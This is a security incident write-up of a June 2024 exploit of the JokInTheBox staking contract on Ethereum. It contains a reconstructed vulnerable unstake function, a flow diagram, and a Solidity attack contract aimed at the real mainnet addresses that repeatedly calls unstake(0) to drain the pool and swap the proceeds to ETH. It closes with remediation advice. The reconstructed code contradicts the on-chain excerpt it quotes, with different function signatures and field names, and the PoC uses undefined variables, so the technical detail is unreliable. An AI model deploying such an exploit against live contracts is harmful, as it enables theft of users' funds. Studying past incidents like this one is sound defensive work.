# JokInTheBox — unstake(index=0) Repeated-Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | JokInTheBox |
| **Chain** | Ethereum |
| **Loss** | ~9.2 ETH |
| **JokInTheBox Staking** | [0xA6447f6156EFfD23EC3b57d5edD978349E4e192d](https://etherscan.io/address/0xA6447f6156EFfD23EC3b57d5edD978349E4e192d) |
| **JOK Token** | [0xA728Aa2De568766E2Fa4544Ec7A77f79c0bf9F97](https://etherscan.io/address/0xA728Aa2De568766E2Fa4544Ec7A77f79c0bf9F97) |
| **Root Cause** | The `unstake(uint256 index)` function does not delete the staking entry after withdrawal, allowing repeated calls with the same index=0; after a 3-day waiting period, the principal can be withdrawn indefinitely |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/JokInTheBox_exp.sol) |

---

## 1. Vulnerability Overview

The `unstake(uint256 index)` function of the JokInTheBox staking contract does not delete or invalidate the staking entry from the array after withdrawal. After the 3-day lock period elapses, an attacker can repeatedly call `unstake(0)` to continuously withdraw the same staked principal. This allowed approximately 9.2 ETH worth of JOK tokens to be stolen.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no entry deletion after unstake
contract JokInTheBoxStaking {
    struct StakeEntry {
        uint256 amount;
        uint256 startTime;
        bool active;
    }
    mapping(address => StakeEntry[]) public stakes;

    function stake(uint256 amount) external {
        stakes[msg.sender].push(StakeEntry({
            amount: amount,
            startTime: block.timestamp,
            active: true
        }));
        JOK.transferFrom(msg.sender, address(this), amount);
    }

    function unstake(uint256 index) external {
        StakeEntry storage entry = stakes[msg.sender][index];
        require(entry.active, "not active");
        require(block.timestamp >= entry.startTime + 3 days, "locked");

        // ❌ No entry deletion — active flag is never set to false
        uint256 amount = entry.amount;
        JOK.transfer(msg.sender, amount);
        // entry.active = false; ← this line is missing
    }
}

// ✅ Safe code: immediately invalidate the entry after withdrawal
function unstake(uint256 index) external {
    StakeEntry storage entry = stakes[msg.sender][index];
    require(entry.active, "not active");
    require(block.timestamp >= entry.startTime + 3 days, "locked");

    entry.active = false;  // update state first (CEI pattern)
    uint256 amount = entry.amount;
    entry.amount = 0;
    JOK.transfer(msg.sender, amount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: JokInTheBoxStaking.sol
    function stake(uint256 amount, uint256 lockPeriod) external {  // ❌ vulnerability
        require(validLockPeriods[lockPeriod].isValid, "Invalid lock period!");

        uint256 currentDay = getCurrentDay();

        stakes[msg.sender].push(Stake({
                unstaked: false,
                amountStaked: amount,
                lockPeriod: lockPeriod,
                stakedDay: currentDay,
                unstakedDay: 0
        }));
        totalStaked += amount;

        jokToken.transferFrom(msg.sender, address(this), amount); // Transfer JOK from user to the contract

        emit NewStake(msg.sender, amount, block.timestamp, lockPeriod, stakes[msg.sender].length - 1);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Acquire JOK tokens (swap)
  │
  ├─→ [2] stake(amount)
  │         └─ stakes[attacker][0] = {amount, startTime, active=true}
  │
  ├─→ [3] Wait 3 days (test: vm.warp +3 days)
  │
  ├─→ [4] unstake(0) × N repeated calls
  │         └─ entry.active = true (never changed)
  │         └─ block.timestamp >= startTime + 3days (passes)
  │         └─ transfers amount JOK on every call
  │         └─ staking pool drained
  │
  ├─→ [5] Swap JOK → ETH
  │
  └─→ [6] ~9.2 ETH stolen
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IJokInTheBoxStaking {
    function stake(uint256 amount) external;
    function unstake(uint256 index) external;
}

interface IUniswapV2Router {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract AttackContract {
    IJokInTheBoxStaking constant staking = IJokInTheBoxStaking(0xA6447f6156EFfD23EC3b57d5edD978349E4e192d);
    IERC20 constant JOK = IERC20(0xA728Aa2De568766E2Fa4544Ec7A77f79c0bf9F97);

    function testExploit() external {
        // [1] Acquire JOK and stake
        uint256 stakeAmount = JOK.balanceOf(address(this));
        JOK.approve(address(staking), stakeAmount);
        staking.stake(stakeAmount);

        // [2] Wait 3 days (test: vm.warp(block.timestamp + 3 days))

        // [3] Repeatedly call unstake(0) — passes every time since entry is never deleted
        uint256 poolBalance = JOK.balanceOf(address(staking));
        uint256 repeatCount = poolBalance / stakeAmount + 1;

        for (uint256 i = 0; i < repeatCount; i++) {
            try staking.unstake(0) {
                // Receives stakeAmount JOK on every call
            } catch {
                break; // Stop when pool is drained
            }
        }

        // [4] Swap acquired JOK → ETH
        uint256 jokBal = JOK.balanceOf(address(this));
        JOK.approve(address(router), jokBal);
        address[] memory path = new address[](2);
        path[0] = address(JOK);
        path[1] = WETH;
        router.swapExactTokensForETH(jokBal, 0, path, address(this), block.timestamp);
        // ~9.2 ETH stolen
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing staking entry invalidation (repeated withdrawal) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (repeated unstake(0) calls) |
| **DApp Category** | Token staking contract |
| **Impact** | Full staking pool drained via repeated withdrawals (~9.2 ETH) |

## 6. Remediation Recommendations

1. **Apply CEI Pattern**: Execute `entry.active = false` and `entry.amount = 0` before the token transfer
2. **Delete entry after withdrawal**: Remove or invalidate the entry at the given index from the `stakes[msg.sender]` array
3. **Reentrancy protection**: Add the `nonReentrant` modifier
4. **Balance validation**: Add `require(JOK.balanceOf(address(this)) >= amount)`

## 7. Lessons Learned

- Failing to invalidate an entry in a staking withdrawal function enables infinite repeated calls with the same index.
- The CEI (Checks-Effects-Interactions) pattern is essential not only for reentrancy defense but also for maintaining state integrity.
- Omitting the `active` flag reset or `amount = 0` initialization is a critical security flaw in staking protocols.